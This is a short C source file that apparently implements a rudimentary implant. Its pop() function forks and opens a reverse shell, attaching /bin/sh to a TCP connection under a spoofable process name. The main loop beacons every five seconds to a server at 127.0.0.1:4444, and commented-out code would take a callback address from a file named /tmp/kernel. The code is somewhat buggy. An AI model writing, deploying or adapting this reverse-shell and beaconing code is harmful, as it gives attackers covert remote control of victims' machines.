#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>

int pop(char *lhost, char *pname, int lport) {
    struct sockaddr_in base;
    int child = fork();
    if (child == 0) {
        base.sin_family = AF_INET;
        base.sin_addr.s_addr = inet_addr(lhost);
        base.sin_port = htons(lport);
        
        int r = socket(AF_INET, SOCK_STREAM, 0);
        connect(r, (struct sockaddr *)&base, sizeof(base));
        dup2(r, 0);
        dup2(r, 1);
        dup2(r, 2);
        execl("/bin/sh", pname, NULL);
    } else 
        return 1;
    return 0;
}

int read_server(char *addr, int port, char *c) {
    struct sockaddr_in cc;
    char m[512];
    
    int r = socket(AF_INET, SOCK_STREAM, 0);
    if (r == -1) {
        fprintf(stderr, "Cannot create socket");
        return 1;
    }
    
    cc.sin_family = AF_INET;
    cc.sin_addr.s_addr = inet_addr(addr);
    cc.sin_port = htons(port);
    
    int st_r = connect(r , (struct sockaddr *)&cc , sizeof(cc));
    
    if (st_r < 0) {
        fprintf(stderr, "Cannot connect");
        return 1;
    }
    
    if( recv(r, m, 512, 0) < 0) {
        fprintf(stderr, "Receive failed");
    }
    c = m;
    printf("%s\n", c);
    
    return 0;
    
}

int main(int argc, char *argv[])
{
    int c;
    char buff[64];
    while (1) {
        sleep(5);
        // FILE *f = fopen("/tmp/kernel", "r");
        // if( access("/tmp/kernel",F_OK ) != -1 ) {
        // if (f != NULL ) {
        //    fgets(buff, 64, f);
        //    printf("calling out to %s\n", buff);
        //    pop(buff,55555);
        //} else
        //    continue;
        read_server("127.0.0.1", 4444, buff);
    }
}
